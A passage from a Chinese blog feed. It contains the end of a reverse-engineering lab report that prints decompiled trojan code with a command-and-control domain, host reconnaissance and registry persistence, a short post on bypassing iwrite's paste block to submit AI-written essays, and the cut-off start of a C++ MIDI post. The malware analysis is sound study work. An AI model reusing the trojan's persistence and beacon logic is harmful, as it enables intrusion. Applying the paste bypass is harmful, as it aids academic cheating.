创建一个名称为&#x27;Path&#x27;的目录</span></span><br><span class="line">  _mkdir((<span class="type">const</span> <span class="type">char</span> *)Path);</span><br><span class="line">  <span class="comment">// 将目录的文件属性设置为&#x27;2u&#x27;</span></span><br><span class="line">  SetFileAttributesA((LPCSTR)Path, <span class="number">2u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将&#x27;Path&#x27;中的每个字符复制到&#x27;byte_413298&#x27;中，直到遇到空终止符</span></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = Path[v0];</span><br><span class="line">    byte_413298[v0++] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取一个字符串&quot;oDbdi&quot;并将其存储在&#x27;v2&#x27;中</span></span><br><span class="line">  v2 = sub_4026E0(<span class="string">&quot;oDbdi&quot;</span>, <span class="number">1</span>);                                                <span class="comment">// nCach</span></span><br><span class="line">  <span class="comment">// 将&quot;\\&quot;附加到&#x27;Path&#x27;末尾</span></span><br><span class="line">  *(_WORD *)&amp;Path[<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Path)] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">  <span class="comment">// 将&quot;\\&quot;附加到&#x27;byte_413298&#x27;末尾</span></span><br><span class="line">  *(_WORD *)&amp;byte_413298[<span class="built_in">strlen</span>(byte_413298)] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将&#x27;byte_413298&#x27;中的每个字符复制到&#x27;byte_4133A0&#x27;中，直到遇到空终止符</span></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = byte_413298[v3];</span><br><span class="line">    byte_4133A0[v3++] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将存储在&#x27;v2&#x27;中的字符串连接到&#x27;byte_4133A0&#x27;中</span></span><br><span class="line">  <span class="built_in">strcat</span>(byte_4133A0, v2);</span><br><span class="line">  <span class="comment">// 将字符串&quot;xjomho/fyf&quot;连接到&#x27;Path&#x27;中</span></span><br><span class="line">  <span class="built_in">strcat</span>((<span class="type">char</span> *)Path, sub_4026E0(<span class="string">&quot;xjomho/fyf&quot;</span>, <span class="number">1</span>));                                       <span class="comment">// winlgn.exe   // 这个是木马创建的文件</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用函数sub_401740()</span></span><br><span class="line">  sub_401740();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取当前模块的文件名并将其存储在&#x27;Filename&#x27;中</span></span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果文件名与&#x27;Path&#x27;不同，并且无法以只读模式打开文件，则调用sub_402740()</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(Filename, (<span class="type">const</span> <span class="type">char</span> *)Path) &amp;&amp; !fopen((<span class="type">const</span> <span class="type">char</span> *)Path, <span class="string">&quot;rb&quot;</span>) )</span><br><span class="line">    sub_402740();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当WSAStartup()返回非零值时，持续睡眠</span></span><br><span class="line">  <span class="keyword">while</span> ( WSAStartup(<span class="number">0x202u</span>, &amp;stru_412D00) )</span><br><span class="line">    Sleep(<span class="number">0x1388u</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化pHints结构体的一些成员</span></span><br><span class="line">  pHints.ai_flags = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_addrlen = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_canonname = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_addr = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_next = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_family = <span class="number">0</span>;</span><br><span class="line">  pHints.ai_socktype = <span class="number">1</span>;</span><br><span class="line">  pHints.ai_protocol = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取一个字符串&quot;pomjofkpiomjof::/psh&quot;并将其存储在&#x27;v5&#x27;中</span></span><br><span class="line">  v5 = sub_4026E0(<span class="string">&quot;pomjofkpiomjof::/psh&quot;</span>, <span class="number">1</span>);                                                 <span class="comment">// onlinejohnline99.org</span></span><br><span class="line">  v7 = pNodeName;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LOBYTE(v6) = *v5;</span><br><span class="line">    *v7++ = *v5++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)v6 );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 调用函数sub_401570()，传入参数v6和v7</span></span><br><span class="line">  sub_401570(v6, v7);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用循环比较&#x27;Path&#x27;和&#x27;Filename&#x27;中的字符，直到出现不相等的字符或遇到空终止符为止</span></span><br><span class="line">  v8 = Path;</span><br><span class="line">  v9 = Filename;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)*v9 &lt; *v8;</span><br><span class="line">    <span class="keyword">if</span> ( *v9 != *v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*v9 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    v11 = v9[<span class="number">1</span>];</span><br><span class="line">    v10 = v11 &lt; v8[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v11 != v8[<span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 += <span class="number">2</span>;</span><br><span class="line">    v8 += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v11 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 如果循环结束时v12为非零值，则调用sub_401360(v8)</span></span><br><span class="line">  v12 = -v10 - (v10 - <span class="number">1</span>);</span><br><span class="line">LABEL_19:</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    sub_401360(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>该函数的主要作用是在指定目录下创建一个隐藏目录，并将一些文件复制到该目录中，然后比较当前模块的文件路径与指定路径，如果不同，则执行一些额外的操作。</p>
<blockquote>
<p>下面再分析一下函数 sub_4026E0</p>
</blockquote>
<h4 id="sub-4026E0"><a href="#sub-4026E0" class="headerlink" title="sub_4026E0"></a>sub_4026E0</h4><p><strong>这个函数是为了简单加密字符串</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_BYTE *__usercall sub_4026E0@&lt;eax&gt;(<span class="type">const</span> <span class="type">char</span> *a1@&lt;eax&gt;, <span class="type">char</span> a2)</span><br><span class="line"><span class="comment">// 定义一个函数 sub_4026E0，接受一个字符串和一个字符作为参数，用于简单加密字符串</span></span><br><span class="line"><span class="comment">// @param a1: 输入字符串的指针</span></span><br><span class="line"><span class="comment">// @param a2: 加密密钥字符</span></span><br><span class="line"><span class="comment">// @return: 返回加密后字符串的指针</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// 存储字符串的长度</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// 存储动态分配的内存空间的地址</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// 用于遍历加密后的字符串</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// 用于遍历原始字符串</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// 字符串的长度计数</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1); <span class="comment">// 获取字符串长度</span></span><br><span class="line">  v4 = <span class="built_in">malloc</span>(v3 + <span class="number">1</span>); <span class="comment">// 动态分配内存空间，大小为字符串长度加1（用于存储结束符）</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果字符串长度小于等于0，直接返回空字符串</span></span><br><span class="line">  <span class="keyword">if</span> (v3 &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    v5 = v4; <span class="comment">// 初始化加密后字符串的指针</span></span><br><span class="line">    v6 = (<span class="type">const</span> <span class="type">char</span> *)(a1 - v4); <span class="comment">// 获取原始字符串的起始位置</span></span><br><span class="line">    v7 = v3; <span class="comment">// 初始化字符串的长度计数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对原始字符串进行简单加密操作</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      *v5 = v5[(_DWORD)v6] - a2; <span class="comment">// 将原始字符串中的每个字符减去密钥字符</span></span><br><span class="line">      ++v5; <span class="comment">// 移动到下一个字符位置</span></span><br><span class="line">      --v7; <span class="comment">// 更新字符串长度计数</span></span><br><span class="line">    &#125; <span class="keyword">while</span> (v7); <span class="comment">// 循环直到字符串结束</span></span><br><span class="line"></span><br><span class="line">    v4[v3] = <span class="number">0</span>; <span class="comment">// 在加密后字符串的末尾添加结束符</span></span><br><span class="line">    <span class="keyword">return</span> v4; <span class="comment">// 返回加密后字符串的指针</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接受一个字符串和一个字符作为参数，然后将字符串中的每个字符减去给定的字符（密钥），从而对字符串进行加密。加密后的字符串存储在动态分配的内存空间中，并返回指向该内存空间的指针。</p>
<p>实际上在这里秘钥是 1，所以加密后的字符串就是原始字符串的 ASCII 码每个字符减去 1。</p>
<p>下面是等效的 Python 代码：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_ascii_1</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">        plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>(<span class="built_in">ord</span>(char) - key)</span><br><span class="line">            plaintext += decrypted_char</span><br><span class="line">        <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输入你的ASCII-1加密密文和密钥</span></span><br><span class="line">    ciphertext = <span class="built_in">input</span>(<span class="string">&quot;请输入要解密的ASCII-1加密密文：&quot;</span>)</span><br><span class="line">    key = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密并输出明文</span></span><br><span class="line">    plaintext = decrypt_ascii_1(ciphertext, key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的明文：&quot;</span>, plaintext)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>下面再分析一下函数 sub_401740</p>
</blockquote>
<h4 id="sub-401740"><a href="#sub-401740" class="headerlink" title="sub_401740"></a>sub_401740</h4><p><strong>这个函数是为了获取计算机名、用户名</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401740</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  DWORD nSize; <span class="comment">// 存储要获取的字符串的大小</span></span><br><span class="line">  DWORD pcbData; <span class="comment">// 存储注册表数据的大小</span></span><br><span class="line">  DWORD pcbBuffer; <span class="comment">// 存储要获取的用户名称的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取计算机名称，并存储在Buffer中</span></span><br><span class="line">  nSize = <span class="number">255</span>;</span><br><span class="line">  GetComputerNameA(Buffer, &amp;nSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表中的产品名称，并存储在unk_413AD0中</span></span><br><span class="line">  pcbData = <span class="number">0x2000</span>;</span><br><span class="line">  RegGetValueA(</span><br><span class="line">    HKEY_LOCAL_MACHINE, <span class="comment">// 主键</span></span><br><span class="line">    <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</span>, <span class="comment">// 子键路径</span></span><br><span class="line">    <span class="string">&quot;ProductName&quot;</span>, <span class="comment">// 值名称</span></span><br><span class="line">    <span class="number">0xFFFFu</span>, <span class="comment">// 标志，指定数据类型</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment">// 保留</span></span><br><span class="line">    &amp;unk_413AD0, <span class="comment">// 存储获取的值</span></span><br><span class="line">    &amp;pcbData); <span class="comment">// 获取的值的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取用户名称，并存储在byte_412F90中</span></span><br><span class="line">  pcbBuffer = <span class="number">255</span>;</span><br><span class="line">  GetUserNameA(byte_412F90, &amp;pcbBuffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>该函数的主要作用是获取计算机名、用户名，并将它们保存到全局变量中。</p>
<blockquote>
<p>下面再分析一下函数 sub_402740</p>
</blockquote>
<h4 id="sub-402740"><a href="#sub-402740" class="headerlink" title="sub_402740"></a>sub_402740</h4><p><strong>这个函数是为了复制文件</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_402740</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">errno_t</span> v0; <span class="comment">// 用于存储第一个文件打开的错误码</span></span><br><span class="line">  <span class="type">errno_t</span> v1; <span class="comment">// 用于存储第二个文件打开的错误码</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// 用于存储每次读取的字符</span></span><br><span class="line"></span><br><span class="line">  FILE *Stream; <span class="comment">// 第一个文件的文件指针</span></span><br><span class="line">  FILE *v5; <span class="comment">// 第二个文件的文件指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试以只读模式打开第一个文件</span></span><br><span class="line">  v0 = fopen_s(&amp;Stream, Filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="comment">// 尝试以写入模式打开第二个文件</span></span><br><span class="line">  v1 = fopen_s(&amp;v5, (<span class="type">const</span> <span class="type">char</span> *)Path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果第一个文件打开失败，则返回错误码 -1</span></span><br><span class="line">  <span class="keyword">if</span> (v0)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果第二个文件打开失败，则关闭第一个文件，并返回错误码 -1</span></span><br><span class="line">  <span class="keyword">if</span> (v1)</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(Stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 循环读取第一个文件的内容，并将其写入到第二个文件中，直到到达文件末尾</span></span><br><span class="line">  <span class="keyword">for</span> (i = fgetc(Stream); !feof(Stream); i = fgetc(Stream))</span><br><span class="line">    fputc(i, v5);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭文件流</span></span><br><span class="line">  fclose(v5);</span><br><span class="line">  fclose(Stream);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回成功码 0</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这个函数的作用是将一个文件的内容复制到另一个文件中，如果其中一个文件打开失败，则返回 -1。</p>
<blockquote>
<p>下面再分析一下函数 sub_401570</p>
</blockquote>
<h4 id="sub-401570"><a href="#sub-401570" class="headerlink" title="sub_401570"></a>sub_401570</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401570</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// 用于存储字符串长度</span></span><br><span class="line">  BYTE *v1; <span class="comment">// 用于存储数据的指针</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// 用于操作注册表键的句柄</span></span><br><span class="line">  DWORD cbData; <span class="comment">// 用于存储数据的字节数</span></span><br><span class="line">  DWORD Type; <span class="comment">// 用于存储数据的类型</span></span><br><span class="line">  BYTE Data[<span class="number">1024</span>]; <span class="comment">// 用于存储注册表数据的缓冲区</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试打开注册表中的键</span></span><br><span class="line">  <span class="keyword">if</span> ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;</span>, <span class="number">0</span>, <span class="number">0x101u</span>, &amp;phkResult) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果打开失败，则将 Buffer 和 &quot;@!&quot; 追加到 byte_4137C0 中</span></span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, Buffer);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;@!&quot;</span>);</span><br><span class="line">    <span class="comment">// 计算 byte_412F90 的长度并加 1</span></span><br><span class="line">    v0 = <span class="built_in">strlen</span>(byte_412F90) + <span class="number">1</span>;</span><br><span class="line">    v1 = (BYTE *)byte_412F90; <span class="comment">// 将 byte_412F90 的地址赋给 v1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果成功打开注册表键，则查询 &quot;ProductId&quot; 的值并将其存储在 Data 中</span></span><br><span class="line">    cbData = <span class="number">1023</span>;</span><br><span class="line">    RegQueryValueExA(phkResult, <span class="string">&quot;ProductId&quot;</span>, <span class="number">0</span>, &amp;Type, Data, &amp;cbData);</span><br><span class="line">    RegCloseKey(phkResult); <span class="comment">// 关闭注册表键</span></span><br><span class="line">    <span class="comment">// 将 Buffer、&quot;##&quot;、byte_412F90 和 &quot;@@&quot; 追加到 byte_4137C0 中</span></span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, Buffer);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;##&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, byte_412F90);</span><br><span class="line">    <span class="built_in">strcat</span>(byte_4137C0, <span class="string">&quot;@@&quot;</span>);</span><br><span class="line">    v0 = <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Data) + <span class="number">1</span>; <span class="comment">// 计算 Data 的长度并加 1</span></span><br><span class="line">    v1 = Data; <span class="comment">// 将 Data 的地址赋给 v1</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 将 v1 指向的 v0 字节的数据复制到 byte_4137C0 中</span></span><br><span class="line">  qmemcpy(&amp;byte_4137C0[<span class="built_in">strlen</span>(byte_4137C0)], v1, v0);</span><br><span class="line">  <span class="keyword">return</span> byte_4137C0; <span class="comment">// 返回 byte_4137C0 的指针</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>从注册表中获取 “ProductId” 值，然后将一些字符串连接起来，并返回结果。</p>
<blockquote>
<p>再看看 sub_401360</p>
</blockquote>
<h4 id="sub-401360"><a href="#sub-401360" class="headerlink" title="sub_401360"></a>sub_401360</h4><p><strong>这个函数是为了保活</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401360</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> CHAR *v0; <span class="comment">// 指向注册表键名的指针</span></span><br><span class="line">  <span class="type">const</span> CHAR *v1; <span class="comment">// 指向注册表值名的指针</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// 字符串缓冲区指针</span></span><br><span class="line">  HKEY phkResult; <span class="comment">// 存储打开的注册表键的句柄</span></span><br><span class="line">  LPCSTR lpSubKey; <span class="comment">// 存储注册表子键路径的指针</span></span><br><span class="line">  <span class="type">const</span> CHAR *v6; <span class="comment">// 指向注册表值名的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表子键路径并存储在lpSubKey中</span></span><br><span class="line">  lpSubKey = sub_4026E0(<span class="string">&quot;Tpguxbsf]Njdsptpgu&quot;</span>, <span class="number">1</span>);                                       <span class="comment">//解密之后是Software\Microsoft</span></span><br><span class="line">  <span class="built_in">strcat</span>((<span class="type">char</span> *)lpSubKey, sub_4026E0(<span class="string">&quot;]Xjoepxt]Dvssfouwfstjpo]&quot;</span>, <span class="number">1</span>));                    <span class="comment">//解密之后是\Windows\Currentversion</span></span><br><span class="line">  *(_DWORD *)&amp;lpSubKey[<span class="built_in">strlen</span>(lpSubKey)] = <span class="number">7238994</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取注册表值名并存储在v0中</span></span><br><span class="line">  v0 = sub_4026E0(<span class="string">&quot;Efgbvmu2&quot;</span>, <span class="number">1</span>);                                                         <span class="comment">//Default1</span></span><br><span class="line">  <span class="comment">// 获取注册表值名并存储在v1中</span></span><br><span class="line">  v1 = sub_4026E0(<span class="string">&quot;TfU&quot;</span>, <span class="number">1</span>);                                                             <span class="comment">//Set</span></span><br><span class="line">  <span class="comment">// 存储原始的注册表值名以备后用</span></span><br><span class="line">  v6 = v1;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果注册表中没有指定的注册表值，则执行以下操作</span></span><br><span class="line">  <span class="keyword">if</span> (RegQueryValueExA(<span class="number">0</span>, v0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 构建字符串并存储在v2中</span></span><br><span class="line">    v2 = sub_4026E0(<span class="string">&quot;dne&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(v2, sub_4026E0(<span class="string">&quot;!0d!tubsu!&amp;TfU&amp;!&quot;</span>, <span class="number">1</span>));                                        <span class="comment">// /c start %SeT%</span></span><br><span class="line">    <span class="built_in">strcat</span>(v2, sub_4026E0(<span class="string">&quot;&#x27;&#x27;!&quot;</span>, <span class="number">1</span>));                                                     <span class="comment">//&amp;&amp;</span></span><br><span class="line">    <span class="built_in">strcat</span>(v2, <span class="string">&quot;exit&quot;</span>);</span><br><span class="line">    <span class="comment">// 打开注册表键</span></span><br><span class="line">    RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, <span class="number">0</span>, <span class="number">0xF003Fu</span>, &amp;phkResult);</span><br><span class="line">    <span class="comment">// 设置注册表值</span></span><br><span class="line">    RegSetValueExA(phkResult, v0, <span class="number">0</span>, <span class="number">1u</span>, (<span class="type">const</span> BYTE *)v2, <span class="built_in">strlen</span>(v2));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    RegCloseKey(phkResult);</span><br><span class="line">    <span class="comment">// 恢复注册表值名为原始值</span></span><br><span class="line">    v1 = v6;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果注册表中没有指定的注册表值，则执行以下操作</span></span><br><span class="line">  <span class="keyword">if</span> (RegQueryValueExA(<span class="number">0</span>, v1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 打开注册表键</span></span><br><span class="line">    RegOpenKeyExA(HKEY_CURRENT_USER, <span class="string">&quot;Environment&quot;</span>, <span class="number">0</span>, <span class="number">0xF003Fu</span>, &amp;phkResult);</span><br><span class="line">    <span class="comment">// 设置注册表值</span></span><br><span class="line">    RegSetValueExA(phkResult, v1, <span class="number">0</span>, <span class="number">1u</span>, Path, <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Path));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    RegCloseKey(phkResult);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>操作 Windows 注册表，为了保活，设置了一些注册表键值。</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>破解PC端iwrite禁用复制</title>
    <url>/posts/9a26b151.html</url>
    <content><![CDATA[<h1 id="破解-PC-端-iwrite-禁用复制"><a href="#破解-PC-端-iwrite-禁用复制" class="headerlink" title="破解 PC 端 iwrite 禁用复制"></a>破解 PC 端 iwrite 禁用复制</h1><p>AI 生成的作文不能粘贴？？？？</p>
<p>我来救救你</p>
<ol>
<li>打开 iwrite</li>
<li>进入作文页面</li>
<li>电脑按下 <code>F12</code></li>
<li>然后按下 <code>F1</code></li>
<li>找到 <code>禁用JavaScript</code> 勾选</li>
</ol>
<blockquote>
<p>一般是禁用 JavaScript 或者是停用 JavaScript，不同浏览器描述可能不同，但基本意思都一样，一眼就能看出来,之后就能粘贴了</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/iwrite/JavaScript.gif"
                      alt="recording"
                ></p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>iwrite</tag>
        <tag>刷课脚本</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>用C++调用MIDI演奏曲阜师范大学校歌</title>
    <url>/posts/e0155dca.html</url>
    <content><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>有一天在B站上看到有大佬用c++演奏音乐，一开始还不知道是调用MIDI函数，后来百度，查CSDN才知道是用函数调用，我直接转手写一个自己学校的校歌</p>
<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><p>首先准备好校歌的键盘，想必大家通知书上都有吧</p>
<p>然后是c++编译器，我用Visual Studio 2022</p>
<p>然后是一些乐理知识，由于我是一个纯工科生，对乐理知识了解程度为0，只能大体看音调，不认识节拍，无奈只能去群里找懂行的人，很巧就有一个19的师姐还一个22的同学解答了我的疑惑</p>
<h1 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h1><p>Scale函数</p>
<p>这个函数是一个简谱对照表，相当于base64编码的编码表</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Scale</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    Rest = <span class="number">0</span>, C8 = <span class="number">108</span>, B7 = <span class="number">107</span>, A7s = <span class="number">106</span>, A7 = <span class="number">105</span>, G7s = <span class="number">104</span>, G7 = <span class="number">103</span>, F7s = <span class="number">102</span>, F7 = <span class="number">101</span>, E7 = <span class="number">100</span>,</span><br><span class="line"></span><br><span class="line">    D7s = <span class="number">99</span>, D7 = <span class="number">98</span>, C7s = <span class="number">97</span>, C7 = <span class="number">96</span>, B6 = <span class="number">95</span>, A6s = <span class="number">94</span>, A6 = <span class="number">93</span>, G6s = <span class="number">92</span>, G6 = <span class="number">91</span>, F6s = <span class="number">90</span>, F6 = <span class="number">89</span>,</span><br><span class="line"></span><br><span class="line">    E6 = <span class="number">88</span>, D6s = <span class="number">87</span>, D6 = <span class="number">86</span>, C6s = <span class="number">85</span>, C6 = <span class="number">84</span>, B5 = <span class="number">83</span>, A5s = <span class="number">82</span>, A5 = <span class="number">81</span>, G5s = <span class="number">80</span>, G5 = <span class="number">79</span>, F5s = <span class="number">78</span>,</span><br><span class="line"></span><br><span class="line">    F5 = <span class="number">77</span>, E5 = <span class="number">76</span>, D5s = <span class="number">75</span>, D5 = <span class="number">74</span>, C5s = <span class="number">73</span>, C5 = <span class="number">72</span>, B4 = <span class="number">71</span>, A4s = <span class="number">70</span>, A4 = <span class="number">69</span>, G4s = <span class="number">68</span>, G4 = <span class="number">67</span>,</span><br><span class="line"></span><br><span class="line">    F4s = <span class="number">66</span>, F4 = <span class="number">65</span>, E4 = <span class="number">64</span>, D4s = <span class="number">63</span>, D4 = <span class="number">62</span>, C4s = <span class="number">61</span>, C4 = <span class="number">60</span>, B3 = <span class="number">59</span>, A3s = <span class="number">58</span>, A3 = <span class="number">57</span>, G3s = <span class="number">56</span>,</span><br><span 